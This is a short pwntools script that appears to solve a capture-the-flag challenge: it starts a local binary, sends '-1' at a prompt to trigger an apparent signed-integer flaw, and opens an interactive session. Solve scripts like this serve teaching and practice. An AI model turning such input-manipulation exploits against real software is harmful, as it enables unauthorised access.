from pwn import *

p = process('./can_I_get_some_gulab_jamuns_plsssssss')

p.sendlineafter(b': ', b'-1')
p.interactive()